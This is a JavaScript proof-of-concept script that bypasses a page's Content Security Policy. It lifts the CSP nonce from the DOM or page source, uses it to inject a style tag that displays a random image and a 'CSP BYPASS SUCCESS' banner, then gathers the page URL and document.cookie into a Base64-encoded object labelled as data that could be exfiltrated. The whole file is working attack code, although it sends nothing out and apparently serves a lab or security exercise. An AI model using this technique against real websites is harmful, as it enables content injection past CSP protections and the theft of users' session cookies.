// Simple CSP Bypass - Extract nonce and inject style to display random image
// Target nonce from HTML: dtSfrCngNYTgXc8lJXEZXg==

// Helper function to decode HTML entities
function decodeHtmlEntities(text) {
  const textarea = document.createElement('textarea');
  textarea.innerHTML = text;
  return textarea.value;
}

// Extract nonce from HTML
function extractNonce() {
  console.log('🔍 Extracting nonce from HTML...');
  
  // Method 1: Try DOM elements first
  const nonceSelectors = ['style[nonce]', 'script[nonce]', '[nonce]'];
  
  for (const selector of nonceSelectors) {
    const element = document.querySelector(selector);
    if (element) {
      let nonce = element.nonce || element.getAttribute('nonce');
      if (nonce) {
        const decodedNonce = decodeHtmlEntities(nonce);
        console.log('✅ Found nonce via DOM:', {
          selector: selector,
          raw: nonce,
          decoded: decodedNonce
        });
        return decodedNonce;
      }
    }
  }
  
  // Method 2: Extract from page source using regex
  const pageSource = document.documentElement.outerHTML;
  const nonceMatch = pageSource.match(/nonce=["']([^"']+)["']/i);
  if (nonceMatch) {
    const rawNonce = nonceMatch[1];
    const decodedNonce = decodeHtmlEntities(rawNonce);
    console.log('✅ Found nonce via regex:', {
      raw: rawNonce,
      decoded: decodedNonce
    });
    return decodedNonce;
  }
  
  console.log('❌ No nonce found');
  return null;
}

// Create style tag with nonce to display random image
function injectImageStyle(nonce) {
  console.log('🎨 Creating style tag with nonce:', nonce);
  
  // Random image URLs for testing
  const randomImages = [
    'https://picsum.photos/200/200?random=1',
    'https://picsum.photos/200/200?random=2', 
    'https://picsum.photos/200/200?random=3',
    'https://images.unsplash.com/photo-1518791841217-8f162f1e1131?ixlib=rb-1.2.1&w=200&h=200&fit=crop',
    'https://images.unsplash.com/photo-1514888286974-6c03e2ca1dba?ixlib=rb-1.2.1&w=200&h=200&fit=crop'
  ];
  
  const randomImage = randomImages[Math.floor(Math.random() * randomImages.length)];
  
  // Create style element
  const style = document.createElement('style');
  style.setAttribute('nonce', nonce);
  
  // CSS to display random image
  style.textContent = `
    /* CSP Bypass Success - Random Image Display */
    body::before {
      content: '';
      position: fixed;
      top: 20px;
      right: 20px;
      width: 200px;
      height: 200px;
      background-image: url('${randomImage}');
      background-size: cover;
      background-position: center;
      border: 5px solid #ff6b6b;
      border-radius: 10px;
      box-shadow: 0 4px 8px rgba(0,0,0,0.3);
      z-index: 9999;
      animation: fadeIn 0.5s ease-in;
    }
    
    /* Success message overlay */
    body::after {
      content: 'CSP BYPASS SUCCESS! 🎉';
      position: fixed;
      top: 230px;
      right: 20px;
      width: 200px;
      background: #4ecdc4;
      color: white;
      padding: 10px;
      text-align: center;
      font-weight: bold;
      border-radius: 5px;
      box-shadow: 0 2px 4px rgba(0,0,0,0.2);
      z-index: 10000;
      animation: slideIn 0.5s ease-out;
    }
    
    @keyframes fadeIn {
      from { opacity: 0; transform: scale(0.8); }
      to { opacity: 1; transform: scale(1); }
    }
    
    @keyframes slideIn {
      from { transform: translateX(100%); }
      to { transform: translateX(0); }
    }
    
    /* Make the main content slightly transparent to highlight our injection */
    .container {
      opacity: 0.8;
    }
  `;
  
  // Inject the style
  document.head.appendChild(style);
  
  console.log('✅ Style injected successfully!');
  console.log('🖼️ Random image URL:', randomImage);
  console.log('🎯 Look for image in top-right corner of page');
  
  // Also log success to console with style
  console.log('%c🎉 CSP BYPASS SUCCESSFUL! 🎉', 'color: #4ecdc4; font-size: 20px; font-weight: bold;');
  
  return randomImage;
}

// Main execution
console.log('🚀 Starting simple nonce-based CSS injection...');

// Extract the nonce
const extractedNonce = extractNonce();

if (extractedNonce) {
  console.log('✅ Nonce extraction successful:', extractedNonce);
  console.log('🎯 Expected nonce: dtSfrCngNYTgXc8lJXEZXg==');
  console.log('🔄 Match check:', extractedNonce === 'dtSfrCngNYTgXc8lJXEZXg==');
  
  // Inject the image style
  const imageUrl = injectImageStyle(extractedNonce);
  
  // Additional success logging
  setTimeout(() => {
    console.log('📊 Injection Summary:');
    console.log('• Nonce used:', extractedNonce);
    console.log('• Image URL:', imageUrl);
    console.log('• Style tag added to <head>');
    console.log('• Check top-right corner for visual confirmation');
    
    // Try to verify our injection worked
    const injectedStyles = document.querySelectorAll('style[nonce]');
    console.log('• Total style tags with nonce:', injectedStyles.length);
    
    // Show data that would be exfiltrated
    const exfilData = {
      url: location.href,
      cookies: document.cookie,
      nonce: extractedNonce,
      success: true,
      timestamp: new Date().toISOString()
    };
    
    console.log('📝 Data that could be exfiltrated:');
    console.log(exfilData);
    console.log('📝 Base64 encoded:', btoa(JSON.stringify(exfilData)));
    
  }, 1000);
  
} else {
  console.log('❌ Failed to extract nonce - CSS injection not possible');
  console.log('🔍 Available elements with nonce attribute:', 
    document.querySelectorAll('[nonce]').length);
}
